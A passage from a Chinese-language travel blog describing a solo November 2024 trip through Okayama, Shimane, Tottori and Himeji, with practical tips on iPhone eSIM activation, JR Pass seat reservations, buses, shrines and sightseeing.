很遠，懶得走來走去就直接來候機室了。沒事先處理一下兩個網路問題，第一個是我的 中華電信漫遊功能是關閉的 ，有需要漫遊方案無法直接購買；所以先打電話去中華電信解鎖漫遊功能，以備不時之需。需要打電話給中華電信、確認個人資料後請客服解除鎖定。事先啟用 eSIM (iPhone 為例)第二個網路問題是先在機場啟用 eSIM，因 eSIM 輸入啟用需要連接網路，怕岡山機場的 WiFi 不穩定，所以事先在台灣網路正常的情況下輸入啟用日本 eSIM。 如果還是很怕網路造成入境問題， 也可先截圖入境 QR Code 或同步寫紙本入境卡，雙重保障。之前去 泰國買的 eSIM 可以直接在購買憑證信、PDF 或截圖照片中長按 QR Code 出現「加入 eSIM」點擊即可自動加入 ，但這次買的日本 eSIM 卻沒有出現：有找到一個 網友提供 的方法可以成功出現「加入 eSIM」選項。(感覺是 iOS Bug，iOS 17.4 之後就壞了)： 前往 eSIM 憑證信、PDF 按下手機截圖，將截圖存在照片相簿中 打開手機相機，點左下角進入相簿 在相簿中找到 eSIM 照片，長按 QRCode 就會出現「加入 eSIM」選項 點擊「加入 eSIM」直接帶入啟用資訊啟用 eSIMiPhone 手動啟用 eSIM前往「設定」-&gt;「行動服務」-&gt;「加入 eSIM」-&gt;「使用行動條碼」：我有把 eSIM QRCode 印出來，所以我是從這邊直接掃描啟用的。如果你什麼都沒有可以點「手動輸入詳細資訊」複製貼上 eSIM 憑證資訊手動啟用：對應信件內容填上 SM-DP+ 位址 、 啟用碼 、 確認碼 (這次沒有)，點下一步完成啟用。輸入完成後需要花一點時間啟用，可能會卡在「啟用中…」一陣子或是跳出啟用失敗稍後再試之類的；再等一下子就好了，啟用成功在「設定」-&gt;「行動服務」中會顯示「開啟」右上角訊號圖標也會出現下面一排 … 顯示訊號狀況。 行動方案標籤可選擇「旅遊」 我們還在台灣，暫時還無法連接使用 eSIM 日本網路，只要確認啟用成功即可。~= 12:20 開始登機，無誤點~= 13:05 準時起飛此時台灣開始下大雨，但是沒什麼風對起飛影響不大。虎航的位子舒適度我覺得算廉航中優秀的了(相較樂桃太小、越捷椅子不好坐)，不過虎航的缺點是 禁止自帶食物 ，剛吃飽不餓！機上無 WiFi 只能聽聽音樂玩玩單機遊戲。可以從窗外看到日本天氣很好。👍👍👍16:30 (台灣時間 15:30) 準時降落降落日本後我們的日本 eSIM 應該就能收到訊號了。 有訊號但還無法上網，要再到「設定」-&gt;「行動服務」-&gt; 點選進入 旅遊 日本 eSIM -&gt; 確認有「開啟此號碼」跟 打開「數據漫遊」這樣才會有網路！⚠️⚠️⚠️ 另外也可以進入 主要 中華電信 號碼，如果您沒有購買中華電信的漫遊方案請記得 關閉這邊的「數據漫遊」、「開啟此號碼」可以繼續保持啟用，這樣才能收台灣的簡訊！ 請注意：不要隨意接電話、海外接國內電話收話方也會被收費！⚠️⚠️⚠️ (只有收簡訊免費)~= 17:00 完成入境、拿行李 岡山桃太郎機場是非常小的機場，同一時間只有一班國際航班(就是你這班而已)，跟著同機的人一起入境、拿行李，很快。(本次航班看起來快滿載，大約花 30 分鐘就出來了) 意外的事是機場工作人員都會講中文 可能因為小機場比較嚴格，如果跟我一樣獨旅的幾乎都被問會待幾天？會去哪些地方？有的還被要求出示飯店訂單。(因此自己去的話請提早準備應對)機場 WiFi 岡山機場免費 WiFi 連上之後要輸入電子郵件，去信箱收信點連結啟用，才能持續連上使用；如果只是為了 Visit Japan 可以在連上 10 分鐘內打開網頁叫出入境 QR Code 即可。~= 17:04 搭上岡山機場前往 JR 岡山車站的巴士最新班次時刻表請參考官網 機場很小，順著路走出來就是往岡山車站的巴士，而且會有工作人員引導、不怕迷路直接上車。 航班太少，所以巴士除了按照表定發車時間，還會跟著班機抵達時間，加開班次；也不用怕滿員搭不上，滿員會再發車。 (照 表定要等到 19:05 才有車 ，但實際有加班車。) 2024/11/30 前出示護照可以 免費搭乘；免費接駁不定期舉辦， 去年來的時候沒有 。~= 18:00 抵達 JR 岡山車站遇到下班時間路上有點塞車，18:00 左右才到岡山車站。 (比預期多 30 分鐘)JR 岡山站兌換 JR Pass &amp; 預定明日前往松江的車票 官網可查詢 可兌換 JR Pass 的車站 ，不是每個站都可以換喔！(JR 岡山站可以) 岡山站找到自動售票處，排中間綠色的機器，只有這一台可以換 JR Pass兌換流程：準備好護照跟購買的 JR Pass 憑證 QR Code，可先選右上語言「繁體中文」，直接點左下「QRコードの読取り(QR碼掃描)」黃色按鈕兌換。 可以選擇開始使用日 ，可預約指定席的時間也是從開始使用日開始計算。 ⚠️ (像我是選擇明天開始)按照步驟掃描 JR Pass QR Code 和護照即可完成兌換。JR Pass QR Code兌換結果：上圖拿去年去兌換的 JR Pass 為圖例兌換完會有三張券，其他兩張長方形的是說明書，沒有用； 印有 PASS 的這張最重要，車站搭車進出站都是憑這張，要收好！預約 JR 指定席這邊很重要，根據 JR Pass 關西＆山陰周遊券官網 提供的資訊， 前往山陰地區的 JR YAKUMO 八雲 やくも 號 是全車指定席 ，無自由座⚠️⚠️⚠️ ( 2024年3月16日開始 )，均需提前劃位。 應該也可以從網路先預約， 之前就是從網路先預約博多到由布院的 JR ，只是要查一下。 Google Map 上的交通資訊不完整，詳細班次跟 列車名稱 可以從 JR 官網查詢得知 。 ⚠️⚠️⚠️JR Pass 預約指定席流程： JR Pass 關西＆山陰周遊券 的規定是可以使用機器預約 6 次指定席，超過要去人工櫃檯預約；各地區 JR Pass 次數跟限制不同，請參考官網資訊。 先查好出發地點的英文名與要去的地方 JR 站英文名 ，例如：OKAYAMA(岡山) -&gt; MATSUE(松江) 請注意是 JR 站英文名， 所以 要去福岡要打 Hakata XD 第一步先選「繁體中文」 第二步直接插入一張「JR Pass 車票」(同行多人要一起劃位會在第四步請你繼續插入。) 其他步驟照以下影片示範完成預約： 影片是我在 安來站 Yasugi 預約前往 鳥取站 Tottori 為例拍攝的整個過程。 (那站沒人在排自動售票機，才敢拿出手機錄下整個過程)預約完成： 因班次與明日行程安排，所以預約早 07:05 的班次先前往松江的飯店寄放行李 實際進出站還是用 JR Pass (上面那張) ⚠️⚠️⚠️，指定券這張只是讓你知道你的車廂跟座位編號。 已經沒靠窗位只能坐走道 QQ在岡山車站隨便買了一個炸牛排便當跟超商買些吃的喝的後就去飯店休息了；岡山車站正在整修，最後一天回程會再回來岡山。從桃太郎商店街這邊走五分鐘就到飯店。~= 19:00 回飯店開吃、休息便當的份量有點少、岡山白桃這罐水蜜桃酒很好喝！再加上懷念的日本超商(全家的)熱狗跟炸雞，今晚很滿足；晚安岡山！為明早早起開始日本行做足準備。岡山後樂園點燈今年 2024 的岡山後樂園點燈是 11月15日(金)～11月24日(日)，來的這天也還沒有；如果有點燈可以去看看，很美。去年 2023 山陽郵寄點燈我拍的照片Day 2 (11/13 週三) 島根 — 出雲大社、宍道湖夕陽07:05 搭乘 Yakumo やくも 八雲號 1 前往 松江車內蠻舒適的，前後有行李區可以直接放行李，座位也有充電座。總路程約需 2 小時 45 分鐘，可以感受到一路穿山越嶺，一大清早的很多地區都還是霧氣濛濛，頗有穿過山洞來到世外桃源的感覺；可惜沒劃到靠窗位，一路只能遠觀。09:49 抵達松江松江天氣超級好☀️，抵達松江站後直接前往今晚入住的飯店「 Matsue Urban Hotel 」寄放行李。寄放完再回到松江站此時大約 10:00，重新劃位 10:48 從 松江 前往 出雲市 的 Yakumo 3 號位子。 應該昨天劃位 岡山到松江 就要順便再劃位一張 松江到出雲市 的 ，因為下午想去看夕陽所以才先在松江寄放行李，不然就直接到出雲市不中途浪費時間換車了。 另外也可以搭乘 一畑電車大社線 前往出雲大社，總時間差不多。還有一點時間跑去超商買了兩個御飯糰、咖啡、炸雞帶著當午餐吃。一路上會經過宍到湖，超級大一開始以為是海，其實是湖。 劃位可以劃 D 靠窗位子才可以直接看宍到湖，我劃 A 側靠山看不到 QQ。11:12 抵達出雲市抵達松江站後一路小跑步，要趕 11:25 一畑電車北松江線 先前往 川跡車站。 一畑電車無法刷交通卡進站，要先在門口自動售票機(可用電子支付)買車票，不知道怎麼買直接跟站務人員說到 Izumo Taisha (出雲大社)即可。在 川跡車站 需要再換車 (跟著大家走到對面月台)，轉乘 一畑電車大社線 前往 出雲大社前 站。約 12 點抵達 出雲大社大神前的表參道很清幽漂亮，有時間的話這邊也有很多小店美食可以逛。 後來才知道出雲四座鳥居也很有名，其中一個白色大鳥居就在出車站表參道往神社反方向走就能在入口找到：來源：島根旅遊官網 詳細可參考 島根旅遊官網往上走到出雲大社入口，來的時間點 2024/11/13 正好是 神在祭 期間 ( 2024 令和 6 年 11/11~11/17 )，所以來參拜的日本人非常多。 日本每年的農曆 10 月(西曆 11 月)，全國八百萬神明齊聚出雲「神議」討論人間事務，如緣分安排與自然調和。 因此 這個月份在日本其他區稱為「神無月」（神不在）且多半無祭典 。 只有在出雲這稱為「神在月」意即只有出雲地區有神。 祭典包括迎接神明的「神迎祭」、祈求良緣的「縁結大祭」、以及送別神明的「神送り祭」 出雲大社供奉主神：大國主命（おおくにぬしのみこと）真的很巧，當初在安排時間的時候其實沒有刻意選這個時間點，是在查景點資訊的時候才知道。穿過入口鳥居後還要再走大約 5 分鐘才會到神社。日本第一大「日之丸」國旗進入神社後往左方看就會看到一根聳立的旗竿，上面是日本最大的日之丸國旗(約 75 張榻榻米、137 平方公尺)。朝這支旗杆的方向走就會來到「神樂殿」這裡有日本第一大 注連繩 。近看真的超大，尤其跟其他殿的一般注連繩比較，大概是其他的 10 倍大。(長度為 14 公尺、重量為 5 公噸、每隔幾年會換一次、純手工製作) 請記得最大的在「神樂殿」這裡，不要跟我一樣一開始以為在本殿。環繞走了一圈，人蠻多的，有的需要排很長的隊伍參拜。 出雲大社的參拜方式跟其他神社也不同：⚠️⚠️⚠️ 是 先鞠躬兩次、拍手四次，最後再鞠躬一次 。買了神在祭期間限定的御守。 (僅此一周販售)參拜完後拿了一本印章搜集簿，蓋出雲大社紀念章。出雲神在月神在社巡拜五個神大社位置。因時間有限出雲其他神社就沒去參拜了，沒有自駕感覺也很難搜集。~= 12:45 徒步前往 稻佐之濱 稻佐海灘 稲佐の浜公車班次太少只能用走的去，大約要 15 分鐘，途中會經過出雲阿國之墓，一路走到底就是稻佐之濱了。 稻佐之濱：來源：島根旅遊官網 日本神話淵源深厚的景點，圖中的小島叫弁天島，島上有一座小祠堂。 日本百大海灘，「日沒聖地出雲」地標、夕陽從弁天島背後落入海中的景色十分美麗，並獲登錄為日本遺產、也是神迎儀式的舉辦地點，在此恭迎日本全國神祇。因為到訪時間有限，無法待到夕陽，逛了一下就折返離開了。 回來台灣滑到 IG，才知道這邊有 砂御守可以求 ：https://www.instagram.com/reel/CynStXPyZAX/走回出雲大社公車站準備搭乘公車回到 JR 出雲站。可以看到來參拜等待進入出雲大社停車場的車輛綿延不絕。出雲大社公車站在紀念品店穿過廁所後面這邊，小小的一開始一直很怕等錯。此時約 13:15，要等 13:40 回 JR 出雲站的公車，肚子很餓就先去前面紀念品店跟旁邊買些東西拿手上簡單吃。在記念品店買了幾個中二貼紙。13:40 搭乘公車回 JR 出雲站 回出雲的路上遇到一位日本人跟我借行動電源，他的手機完全掛了，正好問他確認一下(順便練習我為數不多有記的日文)「 このバスは JR 出雲市駅へ行きますか 」，他回答「 はい 」(我也只聽得懂 hai)。~= 14:15 回到 JR 出雲市站(趕日落前去看宍道湖夕陽，根據資訊 當日 17:05 太陽下山 )這次就沒搭八雲號了，搭 14:54 前往米子的普通區間車，照 Google Map 建議從乃木站下車走路到宍道湖夕日觀景點。 往松江方向坐左邊(A)的話，經過宍道湖就可以直接看到湖景，沒錯我又坐錯邊了，坐到靠山的這邊。 這小站的區間車要按按鈕才會開門，第一次遇到。 ⚠️~=15:35 抵達 乃木站乃木站非常小，沒有站務員也沒有檢票機， 持 JR Pass 搭乘就直接出站就好，不要傻傻的把 JR Pass 留在收票盒子裡。⚠️⚠️⚠️從乃木站走有點失策，這邊很荒涼沒什麼人…不過還好中途有一家 7–11 買了熱狗跟炸雞、飲料邊吃邊等夕陽。16:00 宍道湖等夕陽 宍道湖日本第七大湖泊、宍道湖夕陽，日本第一夕日。 圖中小島嫁島神社，有一個白色小鳥居。 之前打錯打成穴道湖。有一隻鷺。往上走會到島根縣立美術館，那邊比較熱鬧也有咖啡店；但是階梯平台這邊景色角度比較好。16:45 夕陽西下本來沒什麼感覺，但接近夕日的時候開始體會到第一夕陽的魅力，剛剛的鷺也很配合地融入景色。夕陽接近地平線後時間用肉眼可見的速度在消逝，每一分每一秒太陽都在下降。很快地 17:01 就已經看不到太陽了。 真的很美、很療癒。最後再環顧一下 觀夕日階梯平台 一同看夕陽的人們。日落之後轉身等公車準備回松江了。夕陽指數夕陽指數可參考島根旅遊網站宍道湖遊覽船https://hakuchougo.jp/timetable/宍道湖這邊是有遊覽船的 ，可以在接近夕陽的時候搭乘，從船上欣賞夕陽；如果下次再來會想搭搭看。 可以直接使用 買 JR Pass 送的 山陰山陽地區PASS周遊3日券 免費搭乘，現省 1,800 日圓。18:00 回到松江站、飯店在松江站一樓伴手禮店買一些伴手禮想說山陰這邊比較特別就在這買伴手禮吧。比較特別的是牛骨湯拉麵，一般是豚骨，買了一盒回台灣品嚐。買了兩大盒餅乾(適合分同事)回來分同事，甜的普通但是是出雲大社參拜紀念，鹹的海鮮煎餅餅乾我覺得很好吃！回飯店本棟這邊沒有電梯，訂到的是 2 號館，可以從本棟大廳穿過天橋到 2 號館，2 號館 2 樓這邊有交誼廳微波爐、洗衣房、販賣機。 2 號館這邊體感沒有很安全，電梯沒有門禁、 1, 2 樓是膠囊旅館 感覺出入比較複雜、離本館大廳又有距離，因此入住後自己用行李箱把門堵好，怕有怪人闖進來。大廳可以拿免費的面膜、咖啡、茶包。覓食Check-in 後去外面覓食，外面蠻冷的也很暗、冷清，速速去車站周圍的餐廳外帶便當跟去超商買些吃的喝的就回飯店了。牛舌便當好吃，超商買的水蜜桃氣泡酒也好喝。 晚安松江。還有買幾乎每天一樣的隔日早餐組合…全家的這個果肉果汁每次來日本必喝！松江 宍道湖 24 小時直播：無意間找到的 Youtube 頻道，可以看到宍道湖天氣景色。Day 3 (11/14 週四) 松江堀川遊覽船、松江城、足立美術館一早先把行李寄放在飯店，到松江公車站搭公車去松江城遊船。Google Map 看不出月台，只能現場看，2 號月台這邊的車可以到松江城。在縣民會館前下車，一路往松江城走，停車場這邊就能看到「堀川遊覽船」乘船場。啟用買 JR Pass 山陰山陽地區PASS周遊3日券 免費搭乘 堀川遊覽船 下載 Discover Another Japan App 複製憑證信中的序號 打開 App 選擇「輸入」貼上序號按下「有效化」切換到「使用」填寫健康問券，填完會出現 QR Code 相機；掃描店家提供的 QR Code 把結果給他看即完成兌換。也可點「目標內容」查看可兌換項目。 實測計算時間是從第一次兌換目標開始 ，不是輸入序號有效化開始(我是 11/13 輸入的)。幫大家整理幾個熱門可使用地點： 宍道湖遊覽船，原價 1,800 日圓 松江城游船，原價 1600 日圓 足立美術館，原價 2300 日圓 松江城，原價 680 日圓 鳥取沙丘美術館，原價 800 日圓 通天閣，原價 800 日圓 岡山後樂園，原價 410 日圓真的很划算，光上面這些加總就可以省 8,390 日圓，已經是整個 JR Pass 金額的一半了。09:15 搭乘松江遊覽船直接用 周遊3日券 免費兌換搭乘。 今年比較溫暖還沒有換暖桌船 會有四個過橋點需要下降船身，要小心手頭不要夾到 全程約 50 分鐘 上船要脫鞋 ⚠️ 面向船夫的右邊那排才能直接拍到靠松江城的景，離船夫越遠離船頭越近(=剛進去的位子第一排) ⚠️ 如下圖上船囉。可能是因為楓葉季還沒開始，所以沒什麼人，同船的只有四位，很空。有四座橋過橋時會下降船身，要稍微彎腰趴著通過。一路吹風遊河很愜意，船夫也會一路介紹四周景點歷史(雖然我只聽得懂左邊hidari 右邊 migi…)。https://youtube.com/shorts/KA9xKZV16bk最後快到回程的地方會有一個松江城拍攝點，可以從這邊拍松江城遠景。遊船結束大約 10:00。10:15 松江城遊船回來走回來的方向，另一邊就是松江城入口，往上走就會到松江城。途經松江神社，來到松江城。因為時間有限想繼續前往足立美術館，就沒有上去了。回來到來的時候的反方向縣民會館前公車站等車回去。~=10:30 回飯店拿行李大約 10:30 回到松江站，回飯店拿行李。 在這邊等紅綠燈的時候差點被煞車失靈的腳踏車撞，還好我站的比較後面沒撞到我，出門在外還是要小心。 ⚠️⚠️⚠️到車站後同樣去劃位 Yakumo 14 指定席前往 安来(安來) (足立美術館)。11:03 前往安来11:03 才發車，在車站附近買一些吃的在車上果腹。 再見松江。鬆餅跟鹽味烤雞肉都很好吃。11:12 抵達安來站到安來站先別急著出站，找到觀光案內所可以寄放大型行李。(車站外有自動置物櫃但多半都是滿的)11:30 搭乘接駁車前往足立美術館最新時刻表請參考官網行李安放好之後就去搭乘往足立美術館的接駁車(免費、排隊依序上車)，早上來的時候沒什麼人。穿過鄉間小巷大約 20 分鐘抵達足立美術館。下車後一路往前走就是足立美術館入口。一樣直接使用 周遊3日券 免費兌換入場。第一件事是在入口前櫃檯依照自己行程安排領取對應時間的「接駁車整理券」，一人一張；在時間到的時候回到下車的地方憑券搭乘回安來站。我的行程預計是搭乘 14:46 從安來出發前往鳥取的 JR，請注意 往鳥取的班次沒有很多⚠️。 很重要！很重要！很重要！一定要拿，不然不保證有位子能上車。⚠️⚠️⚠️ 我就是那個不知道要拿，本來要搭 13:00 的，結果發現要拿券才回去拿，改搭 13:35 的車回安來。 還好我時間抓得很寬鬆。足立美術館 — 日本第一庭園可以靜靜的坐在這邊享受庭院美景。除了庭院，足立美術館核心還是館藏的諸多藝術品，禁止拍照，一路跟著動線觀賞藝術品，跟庭院。外面可看到部分的庭院景觀，可以感覺得到花費了很大的時間人力在維護這個造景。裡面有兩家喫茶室，除了甜點咖啡也有賣熟食；不妨在此駐足休息吃個東西看看景色。 因為我一個人來就沒有特別停留吃東西了。在紀念品店買了幅看到的館藏畫作 横山大觀《神国日本》(Yokoyama Taikan “Mt.Fuji”) 畫作 的紙板複製畫當紀念品。12:30 在外面商店街晃晃外面有一條小商店街，因為時間還很早就先在這亂晃。 這個島根和牛米漢堡 蠻難吃的 ，就是微波米漢堡飯黏黏的，我吃到的中間和牛還沒完全加熱冰冰的…如同前述，我一開始不知道要拿整理券，傻傻的就去等車，等到 13:00 發現不能上車，才去拿 13:35 的整理券。拿完整理券又再入場(可再入場)坐在一開始的室內觀景區域放空看景等車。13:55 回到安來站回安來站的路上有看到很紅的楓葉。這時間前往足立美術館的人反而比較多。這站沒什麼人、時間也還很早， 趁機錄了一段示範如何使用 JR Pass 預約指定席的影片 。島根貓在觀光案內所亂逛消磨時間。安來這邊的清水寺感覺也是一個賞楓秘境。14:46 搭乘特急火車前往鳥取車型很古老也只有兩節列車(一節自由座、一節指定席)，我的 26 寸行李箱放不上上面的行李層(新的 JR 可以但這車型的太小)，忘記可以走到最後一排放最後一排椅子後面，只能硬塞在自己的位子上。還好一路隔壁都沒人，自由座車廂看起來人比較多，指定席這邊大概才坐 6 成而已。 因為行程安排就沒有特別去 鬼太郎車站(境港車站) 跟 柯南車站(由良車站)了。來源來源 有興趣的朋友可以多安排前往。15:58 抵達 JR 鳥取站前往今晚的飯店 東橫INN 鳥取站南口 ，北口也有一間東橫 INN 沒訂到，北口那邊才是商店街比較熱鬧。17:00 鳥取亂逛離吃飯時間還有一小時，先去附近的 AEON 逛逛。約莫快 18:00 一路走到鳥取北口商店街附近覓食，前幾天都亂吃，今天想找一間餐廳吃好一點。找了一間在大街上評價也不錯的鳥取和牛餐廳 — 「 肉料理 Nick 」品嚐看看鳥取和牛，不知道是不是平日關係只有我一個人。 鳥取和牛雖然沒有神戶牛、近江牛有名，但鳥取是 日本和牛文化的發源地 。我點的是「鳥取和牛ひつまぶし」鳥取和牛三吃飯 3,500 日圓，價格上比神戶牛便宜很多。鳥取和牛很嫩，但是牛味較少，第一吃純吃和牛沒什麼味道。第二、三吃加上它附的湯變茶泡飯就很好吃。18:30 吃飽回車站、飯店順路先去劃隔天到姬路的車票。順路買宵夜回飯店晚上吃，還有 Y1000 養樂多 1000，這次其實沒特別喝也都睡得不錯… 晚安鳥取。Day 4 (11/15 週五) 白兔神社、鳥取沙丘、姬路早上先去白兔神社(姻緣)參拜，回到鳥取站北口往公車總站走，穿過公車大廳到後面 4 號月台等公車。依照 Google Map 搭乘白兔海岸線鹿野營業所 41 前往 白兔神社前。 鳥取的公車無法刷電子支付，只能付現金 鳥取的公車無法刷電子支付，只能付現金 鳥取的公車無法刷電子支付，只能付現金 請先提前準備好零錢，或是仟元大鈔去司機旁邊換零錢。 ⚠️⚠️⚠️ 車資約日圓 610 元。或先去鳥取車站買觀光一日交通券比較划算。下車前依照螢幕顯示金額投幣，我們是總站上車的無券所以看第一格前一格的金額付錢。~= 09:30 抵達白兔神社下車後往回天橋方向走就是白兔神社入口。 白兔神社源於「因幡的白兔」傳說。傳說中，大國主命(出雲大社)在幫助受傷的白兔恢復健康後，獲得白兔的祝福，成功贏得八上比賣公主的愛情。 白兔神社，象徵良緣與治癒，兩座神社也共同承載著祈求幸福與緣結的神聖意義。走到神社的距離不遠但路上有很多兔兔神像，都堆滿了姻緣石。 出雲大社也有很多因幡白兔雕像只是我忘了拍。鳥居上也堆滿了姻緣石。神社整體不大，大約 15–20 分鐘就可以參拜完。也花了 500 日圓買了姻緣石去雕像擺放。我買的因幡之白兔： 左邊：在出雲大社外的禮品店買的 右邊：在白兔神社買的(有詩籤)因幡之白兔跟大國主神的故事。~= 09:50 白兔神社外觀光案內所、白兔海灘觀光案內所裡真的有養一隻白色兔兔，也有賣一些吃的跟伴手禮，買了一個麵包果腹。白兔海灘很荒涼。公車要等到 10:45 才有往鳥取站方向的，覺得比較好的時間是更早來搭更早的車回去節省時間。from: 圣炜 上車記得拿整理券，上面有編號，下車依照編號對應金額硬幣連同整理券一同投入。 ⚠️車上遇到一位中國福建來的觀光客；他的行程剛好跟我相反，他先去姬路再去島根；於是互相推薦了一下景點，他推薦姬路可以先去書寫山圓教寺然後姬路城可以去圖中的攝影點拍照。 感謝他！最後去了覺得很值得。在相生町下車，到對向公車站轉搭前往鳥取沙丘方向的公車。搭到的這班要在沙丘東口下車走上去。 上車整理券拿到 3 號，下車看螢幕對應 3 號的金額投幣，以此為例就是要投 250 日圓。我混亂的參觀路線。下車後回頭岔路依照指標往上經過鳥取沙丘美術館繼續走到鳥取沙丘入口。 鳥取沙丘禁止事項， 尤其禁止在沙上作畫破壞自然 。⚠️鳥取沙丘真的有夠大，此時天空不作美有點陰雨，但如果是大太陽的話應該會很曬。~=12:00 抵達鳥取沙丘日本第一沙丘。人看起來都很渺小，一路走到沙丘脊上，有點抖而且沙子很鬆散不好走。走到最高點可以鳥瞰整個海岸線，背沙丘面海的場景只有這裡有。查網路資料好像可以騎駱駝但今天看起來是因為天氣不好所以沒有。最後離開鳥取沙丘再回頭看一眼，真的很巨大；鞋子裡不免也積了一些沙子， 看有人直接套塑膠鞋套，很聰明。這邊可以直接搭乘纜車到鳥取沙丘展望台，我想說先去下面吃有名的鳥取第一沙丘布丁，就沒搭了；後來順路用走的上去也不遠(~= 15 分鐘而已)。一路從停車場這邊出來，可以看到對面由隈研吾操刀的鳥取砂丘「Takahama Cafe 高濱咖啡廳」。買了一個嚐一嚐，味道真的不錯，布丁牛奶味濃郁口感像奶酪。特色是會給你一小包像沙子的砂糖，加下去一起吃。這邊路上也有一些餐廳可以吃飯，繼續往回走有一條小路，往上走一小段右邊就是沙丘美術館第二入口，左邊再往上走一點就是剛剛纜車會到的地方「鳥取沙丘展望台」。先往左邊去鳥取沙丘展望台看風景、吃東西，會先到纜車上下車處。可以先到販賣及旁邊這邊拿刷子清理鞋子的沙子。(門口工作人員也會提醒)最後也在這邊等公車回鳥取。展望台一二樓都是賣伴手禮跟有一個小餐廳，三樓可以上去眺望鳥取沙丘(雖然看不到什麼東西)。裡面吃的選擇也不太多，要先去旁邊自動販賣機投幣買對應的套餐票券，直接入場找位子坐再把券交給工作人員即可。隨便吃了個牡蠣套餐。也在這邊買了一些鳥取伴手禮。13:30 沙丘美術館吃飽往下走從二號入口往下逛沙丘美術館。(同樣用 周遊3日券 免費入場 )從二號入口開始參觀是從外面的沙雕開始參觀再一路從 3 樓 2 樓往下走，實際館內只有 2 樓有沙雕作品，場館不大、如果不是免費的話我可能不會進來。雖然場地小但是每個沙雕作品的細節都很精緻。還有一個沙雕的沙丘美術館的 QR Code 可以掃描。逛完一圈又往上走回到剛剛的鳥取沙丘展望台，東晃西晃吃個鳥取梨冰淇淋大約 14:20 在站牌這邊等車，等 14:42 往鳥取站的公車。 這站回鳥取的公車來的時候就已經接近滿人了，勉強擠上車，如果有時間可能會找一下從上一站上車會比較好。2025/01 Update回來才看到鳥取因為交通比較不方便，所以有提供計程車包車一日遊， 詳情請參考遊客中心或此網站 。15:10 回到鳥取站大約 15:10 回到鳥取站，此時開始下雨。在車站的商店亂晃，這邊的伴手禮店也有賣沙丘布丁！本來想去鳥取當地有名的 すなば珈琲（砂場咖啡），但下午三點多他們已經休息，就在車站內找了家 nana’s green tea 點個甜點＋咖啡休息充電(人跟手機都要充電)。店內舒適沒什麼人。蕨餅＋冰淇淋＋熱咖啡，很滿足。16:15 回飯店拿行李再回車站等車時間還很早，我們要搭 16:55 的特急超級白兔前往姬路。等車期間有看到柯南列車。16:55 上車前往姬路 再見山陰。劃到 Green Car 第一排座位，很舒適。 行李的話因為車比較晃不敢放到上面，索性走到最後一排座位，橫放在最後一排座位的後面。18:27 抵達姬路站剛好遇到他們的議員選舉，站外有議員在造勢演講，人很多。出站後直接去飯店 東橫INN 姬路站新幹線北口 ，最後三晚都住在這裡，北口這邊的東橫 INN 比較熱鬧；地圖上看很近，實際走起來體感有點距離，大約要 10 分鐘左右。分配到 14 樓頂樓的房間，窗外視野很好。可以直接從窗外回頭看姬路站鐵路，火車經過也會有輕微的軌道聲，但還好晚上之後就沒火車了。19:00 出去亂晃覓食一出來看到姬路城夜景覺得很美，不知道發什麼神經想走到姬路城拍夜景，太接近反而不好取景沒拍什麼照片就走，一路又冷又餓，應該直接去吃飯的。姬路城距離車站約 1 公里，來回走了快 30 分鐘。https://himeji-kyoukasuigetsu.com/en/https://himeji-kyoukasuigetsu.com/en/ 可惜這次錯過了姬路城冬季點燈活動，感覺很漂亮浪漫，之後有機會再來一次吧。 活動時間 2024年11月22日（五）才開始，一路到 2025年2月23日（日）。最後發現車站北口二樓這個看台拍姬路城就是最佳位子。買晚餐前先在姬路站的百貨公司 Piole Himeji 稍微逛了一下跟扭扭蛋。~=20:00 買晚餐回去從二樓空橋一路走到隔壁的 TERASSO 找到一家還沒關門的燒肉店外帶燒肉便當回飯店吃。途經超商同樣買了些吃的喝的。吃飽喝足洗完澡下樓洗個衣服，這次知道東橫要自備洗劑，先投幣買洗衣粉連同衣服投入洗衣機；這間的烘衣機很新很高級，還可以選溫度。 晚安姬路。Day 5 (11/16 週六) 書寫山圓教寺、姬路城、姬路周邊逛街每家東橫 INN 都有提供免費早餐，但我都為了趕行程早上幾乎都自己隨便吃個前一晚買的超商麵包跟咖啡就出門了。08:45 出門早上 8:45 出飯店穿過空無一人的商店街前往車站。08:55 搭公車前往書寫山圓教寺姬路車站有好幾個月台，Google Map 沒寫在哪個月台跟搭幾號公車，只能現場看指標，在 10 號月台搭乘 10 號 日 姫路駅北〜書写山ロープウェイ 公車。 書寫山圓教寺是電影末代武士的取景地點：https://visit-himeji.com/zh-hant/trip-ideas/featured-in-the-last-samurai-shoshazan-engyoji-temple-in-himeji/~=09:20 抵達書寫山纜車搭乘處下車後就是纜車搭乘處，在自動售票機買完來回票就能排隊等纜車了。(15 分鐘一班)書寫山這邊 11/15–17 有夜間特別開放活動，開到晚上 20:00，纜車時間也延長到 20:30。09:30 搭乘纜車上山09:35 抵達書寫山圓教寺入口需要買門票入場，那時候沒仔細看只買了 一般的入山志納金，無法乘坐來回交通車，要用走的上山 。⚠️⚠️⚠️ 坐車約：5 分鐘 爬山約：20 分鐘 (1 KM) 讓我再選的話我選擇多 500 日圓節省時間體力。不過還好是一大早體力精神還很充沛，坡度平緩就一路走走賞楓上山了。穿過仁王門大概還有 400 公尺。09:55 抵達摩尼殿書寫山圓教寺幅員遼闊，全部走完我覺得至少要 2 小時起跳。我只參拜了摩尼殿跟大講堂就折返下山了。摩尼殿可以脫鞋走進去參拜，也可以從這邊鳥瞰楓葉。很清幽安靜，但今年的楓葉較晚只有零星幾株轉紅。從殿後小路往前走前往大講堂。大講堂有一個 圓教寺 x 隈研吾 裝置藝術，展出到 12/1。大講堂旁的楓葉很紅。 到大講堂的時候剛好在誦經，也可以脫鞋入內參拜，日本的僧侶誦經方式跟台灣也不太一樣，會把經文整本拉開然後邊詠誦最後再合起來拍一下。旁邊的食堂也能進去參觀，有很多歷史文物陳列。所有建築都是古蹟(建於1282 年)，走在上面有一種穿越歷史的感覺，整體建築保存維護的很好。從食堂二樓看大講堂。參觀完大講堂後折返回摩尼殿，在摩尼殿外的商店買了一個現烤紅豆麻糬補充體力。(現烤的好吃，皮脆脆)Have a safe trip home.吃完後就再花 20 分鐘走路下山回到志納所入口。~=10:55 搭乘纜車下山11:10 回姬路市區下山走回來的時候的公車站，大約 11:05，等 11:10 公車回姬路市區。~= 11:35 抵達 姬路城公車下車後往前走一點就是姬路城遊船，不過天氣陰陰快下雨就沒去了。走進姬路城，門口這個橋景很好拍照！姬路城前的三之丸廣場很大，從這邊還要再走 5 